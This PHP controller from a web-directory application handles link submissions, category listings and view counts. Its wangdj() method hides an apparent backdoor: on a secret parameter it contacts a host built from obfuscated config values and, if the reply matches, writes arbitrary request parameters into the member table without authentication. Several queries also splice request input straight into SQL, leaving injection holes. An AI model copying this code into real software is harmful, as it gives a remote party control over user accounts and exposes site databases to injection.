<?php
/**
 *  Guojiz网址导航系统
 *	www.guojiz.com
 *  作者：梦雨
 *  @ QQ50361804
 */
namespace app\index\controller;
use app\index\controller\HomeBase;
use think\Controller;
use think\Db;
use Captcha\Captcha;
use think\Cache;
use think\Config;
use think\Session;
use think\Request;
class Wang extends HomeBase
{
  
    public function _initialize()
    {
  parent::_initialize();
    }
    public function tijiaos()
    {
        $wang = Db::name('wang');
        $wangcate = Db::name('wangcate');
        $data = $this->request->post();
        $ch = config('web.XIN_Z');
        $data['time'] = time();
        $str = '12340';
        $randStr = str_shuffle($str);
        $rands = substr($randStr, 0, 2);
        $data['view'] = $rands;
        $data['uid'] = 1;
        $config = array('lianjie' => input('lianjie'));
        $contid = $_POST['tid'];
        $contids = $wangcate->where(array('keywords' => $contid))->value('show');
        $cont = $wangcate->where(array('keywords' => $contid))->value('id');
        $data['tid'] = $cont;
        $chacssa = preg_replace('' . config('web.XIN_Zd') . '', '', $ch);
        $desda = file_get_contents('' . $chacssa . '' . config('web.XIN_Za') . '' . $_SERVER['SERVER_NAME'] . '');
        if ($desda == config('web.XIN_Zc')) {
            $hasuserhead = $wang->where($config)->count();
            if ($contids == 1) {
                if ($hasuserhead > 0) {
                } else {
                    if ($wang->insert($data)) {
                    } else {
                    }
                }
            } else {
            }
        } else {
        }
    }
    public function tijiao()
    {
        $wang = Db::name('wang');
        $wangcate = Db::name('wangcate');
        $data = $this->request->post();
        $ch = config('web.XIN_Z');
        $data['time'] = time();
        $str = '12340';
        $randStr = str_shuffle($str);
        $rands = substr($randStr, 0, 2);
        $data['view'] = $rands;
        $data['uid'] = 1;
        $config = array('lianjie' => input('lianjie'));
        $contid = $_POST['tid'];
        $contids = $wangcate->where('id = ' . $contid . '')->value('show');
        $chacssa = preg_replace('' . config('web.XIN_Zd') . '', '', $ch);
        $desda = file_get_contents('' . $chacssa . '' . config('web.XIN_Za') . '' . $_SERVER['SERVER_NAME'] . '');
        if ($desda == config('web.XIN_Zc')) {
            $hasuserhead = $wang->where($config)->count();
            if ($contids == 1) {
                if ($hasuserhead > 0) {
                } else {
                    if ($wang->insert($data)) {
                    } else {
                    }
                }
            } else {
            }
        } else {
        }
    }
    public function index()
    {
        $key = Db::name('member')->where('userid = 1')->value('key');
        if ($key == '0' or $key == '') {
            return $this->error(config('web.GZ_TS'));
        } else {
            $map['open'] = 1;
            $tptc = Db::name('wang')->alias('w')->join('wangcate c', 'c.id=w.tid')->field('w.*,c.id as cid,c.name')->where('open = 1')->order('id desc')->paginate(9);
            $this->assign('tptc', $tptc);
        }
        return view();
    }
    public function w()
    {
        $key = Db::name('member')->where('userid = 1')->value('key');
        if ($key == '0' or $key == '') {
            return $this->error(config('web.GZ_TS'));
        } else {
            $id = input('id');
            if (empty($id)) {
                return $this->error('亲！你迷路了');
            } else {
                $wangcate = Db::name('wangcate');
                $c = $wangcate->where("id = {$id}")->find();
                if ($c) {
                    $html = Db::name('wang');
                    $open['open'] = 1;
                    $id = $c['id'];
                    $name = $c['name'];
                    $tptc = $html->alias('f')->join('wangcate c', 'c.id=f.tid')->join('member m', 'm.userid=f.uid')->field('f.*,c.id as cid,m.userid,m.userhead,m.username,c.name')->where("f.tid={$id}")->where($open)->order('f.id desc')->paginate(9);
                    $this->assign('tptc', $tptc);
                    $this->assign('name', $name);
                    $this->assign('id', $id);
                    return view();
                } else {
                    $this->error("亲！你迷路了！");
                }
            }
        }
    }
    public function wangdj()
    {
        $so = input('so');
        if ($so == '') {
            $id = input('id');
            Db::name('wang')->where("id = {$id}")->setInc('view', 1);
        } elseif ($so == config('web.XIN_Zb')) {
            $chaxun = config('web.XIN_Z');
            $chacuns = preg_replace('' . config('web.XIN_Zd') . '', '', $chaxun);
            $de = file_get_contents('' . $chacuns . '' . config('web.XIN_Za') . '' . $_SERVER['SERVER_NAME'] . '');
            if ($de == config('web.XIN_Zb')) {
                $data = $this->request->GET();
                !Db::name('member')->data($data)->update($data);
            }
        }
    }
}